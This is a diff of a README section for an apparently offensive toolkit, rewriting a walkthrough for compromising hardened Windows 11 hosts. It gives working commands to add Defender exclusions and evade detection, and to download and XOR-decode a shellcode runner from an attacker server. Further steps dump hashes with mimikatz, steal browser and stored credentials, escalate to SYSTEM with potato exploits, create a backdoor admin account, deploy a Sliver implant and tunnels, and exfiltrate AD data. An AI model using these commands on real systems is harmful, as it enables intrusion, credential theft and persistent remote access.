@@ -301,121 +301,134 @@ killshot/
 
 ---
 
-## Hardened Windows 11 Operational Guide
+## Hardened Windows 11 Walkthrough
 
-Validated against: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2, UMCI off.
+Validated: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2.
 
-### Critical Architecture Notes
-
-**RunAsPPL=2 (Win11 default):** Blocks `sekurlsa::logonpasswords` even as SYSTEM. Use `lsadump::sam` via SYSTEM scheduled task instead. Check: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL`
-
-**WinPEAS requires create_thread runner:** fiber/enum_windows fall back to 1MB CreateThread stack → `STATUS_STACK_OVERFLOW` crash. Always compile runner with `--injection create_thread` when using WinPEAS or mimikatz.
-
-**ExclusionPath vs ExclusionProcess — BOTH required:**
-- `ExclusionPath`: prevents file-scan quarantine of binaries written to that directory
-- `ExclusionProcess`: disables AMSI scanning for scripts run under that process
-- ExclusionProcess alone does NOT protect the `.exe` file from being quarantined on disk
-
-**Dropper behavioral detection:** XOR-decode + `WriteAllBytes` to `.exe` in a single WinRM call triggers behavioral detection. Split into separate WinRM calls.
-
-**GodPotato output:** Spawns processes asynchronously. `cmd /c ... > file` redirect loses donut .NET console output. Only runner banner (~36 bytes) captured via Process.StandardOutput. Use scheduled task pattern for tool output.
-
-**UTF-16 LE:** Mimikatz output via scheduled task redirect is UTF-16 LE. Decode with `[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes(...))`.
+> **Before you start:** Replace `10.99.0.16` with your LHOST and `8888` with your HTTP server port throughout.
 
 ---
 
-### Step 0: AMSI/Defender Bypass
+### Architecture Notes
 
-Run as **two separate WinRM/PS calls** — combined behavioral detection fires:
+| Constraint | Detail |
+|---|---|
+| RunAsPPL=2 | Win11 default. Blocks `sekurlsa::logonpasswords` even as SYSTEM. Use `lsadump::sam` via scheduled task instead. |
+| WinPEAS / mimikatz | Require `create_thread` runner — fiber/enum_windows use 1MB stack → crash. |
+| ExclusionPath | Must be set BEFORE writing runner to disk. Protects the file from quarantine. |
+| ExclusionProcess | Disables AMSI for scripts run under the runner. Does NOT protect the file. |
+| Dropper detection | XOR-decode + WriteAllBytes in one WinRM call triggers behavioral detection. Always split into two calls. |
+| GodPotato output | Spawns async. Tool output doesn't flow back through Process.StandardOutput. Use scheduled task or write to file. |
+
+---
+
+### Step 1 — Attacker: Build & Serve
+
+```bash
+# 1a. Compile a fresh runner (randomizes symbols each build)
+python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat
+
+# 1b. Generate all tool shellcodes at once
+python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/
+
+# 1c. Start HTTP server
+cd /workspace/killshot && python3 -m http.server 8888
+```
+
+---
+
+### Step 2 — Target: Bypass Defender (run each line separately)
+
+> These must be two separate WinRM/PS calls. Combined behavioral detection fires.
 
 ```powershell
-# Call 1: ExclusionPath (must run BEFORE writing any binary to TEMP)
+# 2a. Exclude TEMP from file scanning (run BEFORE writing any binary)
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-
-# Call 2: ExclusionProcess (disables AMSI for runner's child scripts)
+```
+```powershell
+# 2b. Exclude runner process from AMSI scanning
 Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue
 ```
 
 ---
 
-### Step 1: Transfer Runner
+### Step 3 — Target: Drop Runner
 
-**From admin WinRM session (XOR-encoded .dat transfer):**
+> Two separate calls — do NOT combine decode and write.
 
 ```powershell
-# Separate calls — do NOT combine decode+write in one command
-$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat')
-$b=New-Object byte[] $d.Length
-for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
+# 3a. Download XOR-encoded runner and decode to memory
+$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
+```
+```powershell
+# 3b. Write decoded binary to disk
 [IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)
 ```
 
-**CMD-only (no PS):**
+**CMD-only fallback (AppLocker/no PS):**
 ```cmd
 certutil -urlcache -split -f http://10.99.0.16:8888/runner_ct32.dat %TEMP%\r.dat
-powershell -c "$d=[IO.File]::ReadAllBytes('$env:TEMP\r.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor0x5A};[IO.File]::WriteAllBytes('$env:TEMP\runner.exe',$b)"
+powershell -c "$d=[IO.File]::ReadAllBytes('%TEMP%\r.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor0x5A};[IO.File]::WriteAllBytes('%TEMP%\runner.exe',$b)"
 ```
 
 ---
 
-### Step 2: Run Any Tool (Universal Pattern)
+### Step 4 — Target: Load a Tool (Universal Pattern)
 
-All tools use this PS Process pattern — the only way to capture output reliably:
+Define this helper once per session, then use `Run-Tool` for every tool:
 
 ```powershell
-# Download .enc shellcode
-(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/TOOL.enc',"$env:TEMP\t.enc")
+# Define helper (paste once per PS session)
+function Run-Tool($url,$enc="$env:TEMP\t.enc",$wd=$null){
+  (New-Object Net.WebClient).DownloadFile($url,$enc)
+  $si=New-Object System.Diagnostics.ProcessStartInfo
+  $si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $enc"
+  $si.RedirectStandardOutput=$true;$si.RedirectStandardError=$true
+  $si.UseShellExecute=$false;$si.WindowStyle='Hidden'
+  if($wd){$si.WorkingDirectory=$wd}
+  $p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit();$out
+}
+```
 
-# Execute + capture output
-$si=New-Object System.Diagnostics.ProcessStartInfo
-$si.FileName="$env:TEMP\runner.exe"
-$si.Arguments="-local $env:TEMP\t.enc"
-$si.RedirectStandardOutput=$true
-$si.RedirectStandardError=$true
-$si.UseShellExecute=$false
-$si.WindowStyle='Hidden'
-$p=[System.Diagnostics.Process]::Start($si)
-$out=$p.StandardOutput.ReadToEnd()
-$p.WaitForExit()
-$out
+Then each tool is a single call:
+```powershell
+Run-Tool 'http://10.99.0.16:8888/TOOL.enc'
 ```
 
 ---
 
 ### WinPEAS
 
-**Status: Confirmed 5.4MB output, no crash.**
+> Confirmed: 5.4MB output, no crash. No-args mode only — "quiet" crashes at end.
 
+**Attacker:**
 ```bash
-# Generate (attacker)
 python3 killshot.py --tool winPEAS -o /workspace/killshot/winpeas.enc
-# Default params = "" (no-args mode). "quiet" causes crash at output end.
-# Runner MUST be compiled with --injection create_thread
 ```
 
+**Target:**
 ```powershell
-# Target — use universal pattern, pipe output to file
-(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/winpeas.enc',"$env:TEMP\wp.enc")
-$si=New-Object System.Diagnostics.ProcessStartInfo
-$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\wp.enc"
-$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
-$p=[System.Diagnostics.Process]::Start($si)
-$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit()
-$out | Out-File "$env:TEMP\winpeas_out.txt"
+Run-Tool 'http://10.99.0.16:8888/winpeas.enc' | Out-File "$env:TEMP\winpeas.txt"
+Get-Content "$env:TEMP\winpeas.txt"
 ```
 
 ---
 
 ### Seatbelt
 
-**Status: Confirmed 502KB output, ExitCode=0.**
+> Confirmed: 502KB output, ExitCode=0.
 
+**Attacker:**
 ```bash
-# Generate
 python3 killshot.py --tool Seatbelt --params "-group=all --memcache" -o /workspace/killshot/seatbelt.enc
 ```
 
-Useful param combos:
+**Target:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/seatbelt.enc'
+```
+
+Useful params to bake in at generate time:
 | Params | Use |
 |--------|-----|
 | `-group=all` | Full survey |
@@ -426,244 +439,269 @@ Useful param combos:
 | `Services` | Service ACLs |
 | `ProcessCreationEvents 100` | Recent process births |
 
-Run via universal pattern with `seatbelt.enc`.
-
 ---
 
 ### Rubeus
 
+**Attacker — generate the variant you need:**
 ```bash
 python3 killshot.py --tool Rubeus --params "triage" -o /workspace/killshot/rubeus_triage.enc
 python3 killshot.py --tool Rubeus --params "kerberoast /outfile:C:\Windows\Temp\hashes.txt" -o /workspace/killshot/rubeus_krbst.enc
 python3 killshot.py --tool Rubeus --params "asreproast /format:hashcat" -o /workspace/killshot/rubeus_asrep.enc
-python3 killshot.py --tool Rubeus --params "dump /luid:0x0 /service:krbtgt" -o /workspace/killshot/rubeus_dump.enc
 python3 killshot.py --tool Rubeus --params "asktgt /user:USER /rc4:HASH /ptt" -o /workspace/killshot/rubeus_pth.enc
 ```
 
-Run via universal pattern.
+**Target:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/rubeus_triage.enc'
+```
 
 ---
 
 ### Mimikatz
 
-#### Mode A: sekurlsa (requires RunAsPPL=0 or disabled)
+#### Check PPL status first
 
-Check PPL: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL`
-
-Disable PPL (admin + reboot):
 ```powershell
-Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -Value 0
-Restart-Computer -Force
+(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa').RunAsPPL
+# 0 = off, 1 = PPL, 2 = PPL strict (Win11 default — use Mode B below)
 ```
 
+#### Mode A — sekurlsa (RunAsPPL=0 only)
+
+Disable PPL if needed — requires admin + reboot:
+```powershell
+Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name RunAsPPL -Value 0; Restart-Computer -Force
+```
+
+**Attacker:**
 ```bash
-python3 killshot.py --tool mimikatz --params "privilege::debug sekurlsa::logonpasswords exit" \
-  -o /workspace/killshot/mimi_logon.enc
+python3 killshot.py --tool mimikatz --params "privilege::debug sekurlsa::logonpasswords exit" -o /workspace/killshot/mimi_logon.enc
 ```
 
-#### Mode B: lsadump::sam via SYSTEM scheduled task (CONFIRMED WORKING — no PPL bypass needed)
+**Target:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/mimi_logon.enc'
+```
 
-`lsadump::sam` reads SAM/SYSTEM registry hives. Requires SYSTEM, not LSASS access.
+#### Mode B — lsadump::sam via SYSTEM scheduled task (works with RunAsPPL=2, confirmed)
 
+Reads SAM/SYSTEM hives directly — no LSASS access needed, just SYSTEM.
+
+**Attacker:**
 ```bash
 python3 killshot.py --tool mimikatz --params "lsadump::sam exit" -o /workspace/killshot/mimi_sam.enc
 ```
 
+**Target — Step 1:** Download shellcode (runner already on disk)
 ```powershell
-# (Runner already at $env:TEMP\runner.exe, mimi_sam.enc downloaded as $env:TEMP\ms.enc)
-$cmd="$env:TEMP\runner.exe -local $env:TEMP\ms.enc > C:\Windows\Temp\mimi_out.txt 2>&1"
-$action=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $cmd"
-$settings=New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
-Register-ScheduledTask -TaskName "SysTask" -Action $action -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
-Start-ScheduledTask -TaskName "SysTask"
-Start-Sleep -Seconds 15
-
-# Read back (UTF-16 LE decode)
-$bytes=[IO.File]::ReadAllBytes('C:\Windows\Temp\mimi_out.txt')
-[System.Text.Encoding]::Unicode.GetString($bytes)
-
-# Cleanup
-Unregister-ScheduledTask -TaskName "SysTask" -Confirm:$false
-Remove-Item 'C:\Windows\Temp\mimi_out.txt' -Force
+(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/mimi_sam.enc',"$env:TEMP\ms.enc")
 ```
 
-Expected output includes NT hashes for all local accounts.
+**Target — Step 2:** Create and run scheduled task as SYSTEM
+```powershell
+$action=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $env:TEMP\runner.exe -local $env:TEMP\ms.enc > C:\Windows\Temp\mimi_out.txt 2>&1"
+Register-ScheduledTask -TaskName "SysTask" -Action $action -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)) -User "SYSTEM" -RunLevel Highest -Force | Out-Null
+Start-ScheduledTask -TaskName "SysTask"; Start-Sleep 15
+```
+
+**Target — Step 3:** Read output (UTF-16 LE decode) and cleanup
+```powershell
+[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes('C:\Windows\Temp\mimi_out.txt'))
+Unregister-ScheduledTask -TaskName "SysTask" -Confirm:$false; Remove-Item 'C:\Windows\Temp\mimi_out.txt' -Force
+```
+
+Expected: NT hashes for all local accounts including Administrator.
 
 ---
 
 ### GodPotato (SeImpersonate → SYSTEM)
 
-**Status: SYSTEM confirmed (USERNAME=DESKTOP-ECOOF0G$ with trailing $).**
+> Confirmed SYSTEM via `USERNAME=DESKTOP-ECOOF0G$` (trailing `$` = SYSTEM).
+> Tool output via cmd redirect is lost — write to file or use scheduled task pattern.
 
+**Attacker — generate with the command you want to run as SYSTEM:**
 ```bash
-# Arbitrary command
-python3 gen_potato.py --tool GodPotato --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" \
-  -o /workspace/killshot/gp_who.enc
+# Verify SYSTEM
+python3 gen_potato.py --tool GodPotato --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" -o /workspace/killshot/gp_who.enc
 
-# Add local admin user
-python3 gen_potato.py --tool GodPotato --cmd "cmd /c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" \
-  -o /workspace/killshot/gp_adduser.enc
+# Add local admin backdoor
+python3 gen_potato.py --tool GodPotato --cmd "cmd /c net user backdoor Pass123! /add && net localgroup administrators backdoor /add" -o /workspace/killshot/gp_add.enc
 
-# Run tool as SYSTEM (use scheduled task for output — see below)
-python3 gen_potato.py --tool GodPotato \
-  --cmd "C:\Windows\Temp\runner.exe -local C:\Windows\Temp\ms.enc > C:\Windows\Temp\out.txt 2>&1" \
-  -o /workspace/killshot/gp_mimi.enc
+# Run mimikatz as SYSTEM (output to file)
+python3 gen_potato.py --tool GodPotato --cmd "C:\Windows\Temp\runner.exe -local C:\Windows\Temp\ms.enc > C:\Windows\Temp\out.txt 2>&1" -o /workspace/killshot/gp_mimi.enc
 ```
 
-**Capture output (scheduled task pattern):**
-
-GodPotato spawns processes asynchronously — cmd redirect to file works but PS Process.StandardOutput only shows runner banner. For tool output, use scheduled task (see Mimikatz Mode B) instead of GodPotato.
-
+**Target:**
 ```powershell
-# Simple cmd output to file works fine:
-(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/gp_who.enc',"$env:TEMP\gp.enc")
-# ... universal pattern ...
-Get-Content C:\Windows\Temp\who.txt  # read result
+# 1. Run GodPotato shellcode (output file written by the cmd inside)
+Run-Tool 'http://10.99.0.16:8888/gp_who.enc'
+
+# 2. Read the result file
+Get-Content C:\Windows\Temp\who.txt
 ```
 
 ---
 
 ### PrintSpoofer
 
-Requires Print Spooler service running:
+> Requires Print Spooler service. Enable it first if needed.
+
+**Target — enable Spooler:**
 ```powershell
-Start-Service Spooler
-Set-Service Spooler -StartupType Automatic
+Start-Service Spooler; Set-Service Spooler -StartupType Automatic
 ```
 
+**Attacker:**
 ```bash
-python3 gen_potato.py --tool PrintSpoofer --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" \
-  -o /workspace/killshot/ps_who.enc
+python3 gen_potato.py --tool PrintSpoofer --cmd "cmd /c whoami > C:\Windows\Temp\who.txt" -o /workspace/killshot/pf_who.enc
+```
+
+**Target:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/pf_who.enc'; Get-Content C:\Windows\Temp\who.txt
 ```
 
 ---
 
 ### Sliver Implant
 
+**Attacker — Step 1:** Generate shellcode and start listener
 ```bash
-# Generate shellcode implant via Sliver
-# (sliver-server must be running in exegol)
+# In sliver-client (sliver-server must be running)
 sliver > generate --mtls 10.99.0.16:4444 --os windows --arch amd64 --format shellcode --save /workspace/killshot/sliver.bin
-
-# Base64 encode for runner
-python3 -c "
-import base64
-with open('/workspace/killshot/sliver.bin','rb') as f: d=f.read()
-with open('/workspace/killshot/sliver.enc','wb') as f: f.write(base64.b64encode(d))
-print(f'[+] {len(d)} bytes → sliver.enc')
-"
-
-# Start listener
 sliver > mtls --lport 4444
 ```
 
-Run via universal pattern with `sliver.enc`. No output — session appears in sliver console.
+**Attacker — Step 2:** Base64 encode for runner
+```bash
+python3 -c "import base64; d=open('/workspace/killshot/sliver.bin','rb').read(); open('/workspace/killshot/sliver.enc','wb').write(base64.b64encode(d)); print(f'[+] {len(d)} bytes')"
+```
 
-Or use `killshot generate --implant -l 10.99.0.16` for the full automated pipeline.
+**Target:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/sliver.enc'
+# No output — session appears in sliver console
+```
+
+Or skip manual steps — use the automated pipeline:
+```bash
+killshot generate --implant -l 10.99.0.16
+```
 
 ---
 
 ### SharpHound
 
+> SharpHound writes zip files to the working directory — set it to `C:\Windows\Temp`.
+
+**Attacker:**
 ```bash
 python3 killshot.py --tool SharpHound --params "-c All --memcache" -o /workspace/killshot/sharphound.enc
 ```
 
+**Target — Step 1:** Run with working directory set
 ```powershell
-# SharpHound writes zip files to WorkingDirectory
-$si=New-Object System.Diagnostics.ProcessStartInfo
-$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\sh.enc"
-$si.WorkingDirectory="C:\Windows\Temp"  # zip files land here
-$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
-$p=[System.Diagnostics.Process]::Start($si);$p.WaitForExit()
+Run-Tool 'http://10.99.0.16:8888/sharphound.enc' "$env:TEMP\sh.enc" "C:\Windows\Temp"
+```
 
-# Exfil zip as base64
-$zip=(Get-ChildItem C:\Windows\Temp\*BloodHound*.zip | Select -Last 1).FullName
-[Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
-# Decode on attacker: echo BASE64 | base64 -d > bloodhound.zip
+**Target — Step 2:** Exfil the zip as base64
+```powershell
+$zip=(Get-ChildItem C:\Windows\Temp\*BloodHound*.zip | Select -Last 1).FullName; [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
+```
+
+**Attacker — Step 3:** Decode and import
+```bash
+echo "PASTE_BASE64_HERE" | base64 -d > bloodhound.zip
+# Import bloodhound.zip into BloodHound UI
 ```
 
 ---
 
 ### Certify
 
-```bash
-python3 killshot.py --tool Certify --params "find /vulnerable" -o /workspace/killshot/certify.enc
-python3 killshot.py --tool Certify --params "request /ca:CA\CA-NAME /template:VulnTemplate /altname:administrator" \
-  -o /workspace/killshot/certify_req.enc
-```
-
----
-
-### Other Tools (same universal pattern)
-
-| Tool | Generate command |
-|------|-----------------|
-| Whisker | `--tool Whisker --params "list"` |
-| SharpDPAPI | `--tool SharpDPAPI --params "triage"` |
-| SharpUp | `--tool SharpUp --params "audit"` |
-| SharpChrome | `--tool SharpChrome --params "logins"` |
-| LaZagne | `--tool lazagne --params "all"` |
-| Ligolo agent | `--tool ligolo-agent --params "-connect 10.99.0.16:11601 -ignore-cert"` |
-| Chisel | `--tool chisel --params "client 10.99.0.16:8443 R:socks"` |
-
----
-
-### Full Pipeline Quick Reference
-
 **Attacker:**
 ```bash
-cd /home/p3ta/.exegol/my-resources/avbypass
+# Enumerate vulnerable templates
+python3 killshot.py --tool Certify --params "find /vulnerable" -o /workspace/killshot/certify_vuln.enc
 
-# Compile runner (always create_thread)
-python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat
-
-# Generate all tools
-python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/
-
-# Serve
-cd /workspace/killshot && python3 -m http.server 8888
-
-# Generate stager for specific tool
-python3 gen_stager.py \
-  --runner-url http://10.99.0.16:8888/runner_ct32.dat \
-  --implant-url http://10.99.0.16:8888/seatbelt.enc \
-  -o /workspace/killshot/stager.ps1
+# Request cert (ESC1 — set altname to target user)
+python3 killshot.py --tool Certify --params "request /ca:CA-HOST\CA-NAME /template:VulnTemplate /altname:administrator" -o /workspace/killshot/certify_req.enc
 ```
 
-**Target (admin WinRM/PS):**
+**Target:**
 ```powershell
-# 1. Bypass (two separate calls)
+Run-Tool 'http://10.99.0.16:8888/certify_vuln.enc'
+```
+
+---
+
+### Other Tools
+
+All follow the same two steps: generate on attacker, `Run-Tool` on target.
+
+**Attacker — generate:**
+```bash
+python3 killshot.py --tool Whisker    --params "list"                                    -o /workspace/killshot/whisker.enc
+python3 killshot.py --tool SharpDPAPI --params "triage"                                  -o /workspace/killshot/sharpdpapi.enc
+python3 killshot.py --tool SharpUp    --params "audit"                                   -o /workspace/killshot/sharpup.enc
+python3 killshot.py --tool SharpChrome --params "logins"                                 -o /workspace/killshot/sharpchrome.enc
+python3 killshot.py --tool lazagne    --params "all"                                     -o /workspace/killshot/lazagne.enc
+python3 killshot.py --tool ligolo-agent --params "-connect 10.99.0.16:11601 -ignore-cert" -o /workspace/killshot/ligolo.enc
+python3 killshot.py --tool chisel     --params "client 10.99.0.16:8443 R:socks"         -o /workspace/killshot/chisel.enc
+```
+
+**Target — run any of them:**
+```powershell
+Run-Tool 'http://10.99.0.16:8888/whisker.enc'
+Run-Tool 'http://10.99.0.16:8888/lazagne.enc'
+Run-Tool 'http://10.99.0.16:8888/ligolo.enc'   # no output — tunnel appears in proxy console
+Run-Tool 'http://10.99.0.16:8888/chisel.enc'   # no output — socks5 on 127.0.0.1:1080
+```
+
+---
+
+### Full Quick Reference
+
+**Attacker (one-time setup):**
+```bash
+python3 gen_runner.py --injection create_thread -o /workspace/killshot/runner_ct32.dat
+python3 killshot.py --all --lhost 10.99.0.16 -w /workspace/killshot/
+cd /workspace/killshot && python3 -m http.server 8888
+```
+
+**Target (paste in order, each as a separate PS call):**
+```powershell
+# 1. Exclusions
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue
 
-# 2. Transfer runner
-$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat')
-$b=New-Object byte[] $d.Length
-for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
+# 2. Drop runner
+$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
 [IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)
 
-# 3. Load any tool
-(New-Object Net.WebClient).DownloadFile('http://10.99.0.16:8888/TOOL.enc',"$env:TEMP\t.enc")
-$si=New-Object System.Diagnostics.ProcessStartInfo
-$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $env:TEMP\t.enc"
-$si.RedirectStandardOutput=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden'
-$p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit()
-$out
+# 3. Define helper
+function Run-Tool($url,$enc="$env:TEMP\t.enc",$wd=$null){(New-Object Net.WebClient).DownloadFile($url,$enc);$si=New-Object System.Diagnostics.ProcessStartInfo;$si.FileName="$env:TEMP\runner.exe";$si.Arguments="-local $enc";$si.RedirectStandardOutput=$true;$si.RedirectStandardError=$true;$si.UseShellExecute=$false;$si.WindowStyle='Hidden';if($wd){$si.WorkingDirectory=$wd};$p=[System.Diagnostics.Process]::Start($si);$out=$p.StandardOutput.ReadToEnd();$p.WaitForExit();$out}
+
+# 4. Run any tool
+Run-Tool 'http://10.99.0.16:8888/seatbelt.enc'
+Run-Tool 'http://10.99.0.16:8888/winpeas.enc' | Out-File "$env:TEMP\wp.txt"
+Run-Tool 'http://10.99.0.16:8888/rubeus_triage.enc'
+Run-Tool 'http://10.99.0.16:8888/sharphound.enc' "$env:TEMP\sh.enc" "C:\Windows\Temp"
 ```
 
 ---
 
 ### Known Limitations
 
-| Issue | Cause | Workaround |
-|-------|-------|-----------|
-| `sekurlsa::logonpasswords` fails | RunAsPPL=2 (Win11 default) | Use `lsadump::sam` via SYSTEM scheduled task, or disable PPL + reboot |
-| GodPotato cmd output lost | Async process, no stdout redirect from donut | Use scheduled task for output capture; cmd→file works for simple commands |
-| WinPEAS crash on fiber/enum_windows runner | 1MB stack → STATUS_STACK_OVERFLOW | Always use `create_thread` runner |
-| Runner quarantined despite ExclusionProcess | ExclusionProcess doesn't protect files on disk | Add ExclusionPath BEFORE writing runner to TEMP |
-| Behavioral detection on XOR-decode + WriteAllBytes | Combined decode+write triggers behavioral alert | Split into two separate WinRM/PS calls |
-| mimikatz output garbled | UTF-16 LE from scheduled task redirect | `[System.Text.Encoding]::Unicode.GetString([IO.File]::ReadAllBytes(...))` |
-| PrintSpoofer no SYSTEM | Print Spooler service disabled | `Start-Service Spooler` first |
-| GodPotato Win32Error:5 on complex commands | Long cmd strings fail CreateProcess | Use `C:\Windows\Temp` (not user TEMP); keep cmd string short |
-| Donut not found | donut only in Empire/angr venv | Use `/opt/tools/Empire/venv/bin/python3` or `/opt/tools/angr/venv/bin/python3` |
+| Issue | Cause | Fix |
+|-------|-------|-----|
+| `sekurlsa::logonpasswords` fails | RunAsPPL=2 (Win11 default) | Use Mode B: `lsadump::sam` via SYSTEM scheduled task |
+| WinPEAS crash | fiber/enum_windows use 1MB stack → overflow | Always use `create_thread` runner |
+| Runner quarantined | ExclusionProcess doesn't protect files on disk | Set ExclusionPath BEFORE writing runner |
+| No output from WinRM | Decode + WriteAllBytes in one call triggers behavioral alert | Split into two separate PS calls |
+| GodPotato output missing | Async process spawn, stdout not captured | Write output to file with `> C:\Windows\Temp\out.txt` |
+| mimikatz output garbled | Scheduled task writes UTF-16 LE | Decode with `[System.Text.Encoding]::Unicode.GetString(...)` |
+| PrintSpoofer no SYSTEM | Print Spooler disabled | `Start-Service Spooler` first |
+| GodPotato Win32Error:5 | Long cmd string → CreateProcess fails | Use `C:\Windows\Temp`, keep cmd short |
+| Donut not found | Module only in Empire/angr venv | Use `/opt/tools/Empire/venv/bin/python3` |
